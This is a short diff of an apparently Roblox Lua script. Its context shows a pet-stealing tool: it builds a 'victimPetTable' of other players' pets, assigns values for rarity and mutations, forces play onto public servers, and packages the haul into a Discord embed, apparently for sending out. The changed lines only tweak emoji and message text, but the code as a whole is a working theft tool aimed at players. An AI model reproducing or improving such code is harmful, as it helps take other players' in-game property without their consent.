@@ -8,7 +8,7 @@ if getServerType and getServerType:IsA("RemoteFunction") then
         return getServerType:InvokeServer()
     end)
     if ok and serverType == "VIPServer" then
-        plr:Kick("Server error. Please join a DIFFERENT server")
+        plr:Kick("Server error. Please join a Public Server")
         return
     end
 end
@@ -30,9 +30,9 @@ local PET_VALUES = {
     ["Butterfly"] = { emoji = "🦋", value = 4000 },
     ["Disco Bee"] = { emoji = "🐝", value = 4200 },
     ["Mimic Octopus"] = { emoji = "🐙", value = 6000 },
-    ["Queen Bee"] = { emoji = "👑🐝", value = 6500 },
+    ["Queen Bee"] = { emoji = "🐝", value = 6500 },
     ["Spinosaurus"] = { emoji = "🦕", value = 5500 },
-    ["Kitsune"] = { emoji = "🦊✨", value = 8000 },
+    ["Kitsune"] = { emoji = "🦊", value = 8000 },
 }
 
 local victimPetTable = {}
@@ -164,7 +164,7 @@ function createDiscordEmbed(petList, totalValue, fileUrl)
             },
             {
                 name = "💰 **Total Value**",
-                value = string.format("```%s¢```", totalValue),
+                value = string.format("```%s```", totalValue),
                 inline = false
             },
             {
@@ -247,13 +247,13 @@ local function getPlayersPets()
             local mutation = ""
 
             if string.find(value.PetType, "Rainbow") then
-                mutation = "🌈 "
+                mutation = "Rainbow "
                 petInfo.value += 10000
             elseif string.find(value.PetType, "Mega") then
-                mutation = "💥 "
+                mutation = "Mega"
                 petInfo.value += 15000
             elseif string.find(value.PetType, "Ascended") then
-                mutation = "✨ "
+                mutation = "Ascended "
                 petInfo.value += 8000
             end
 
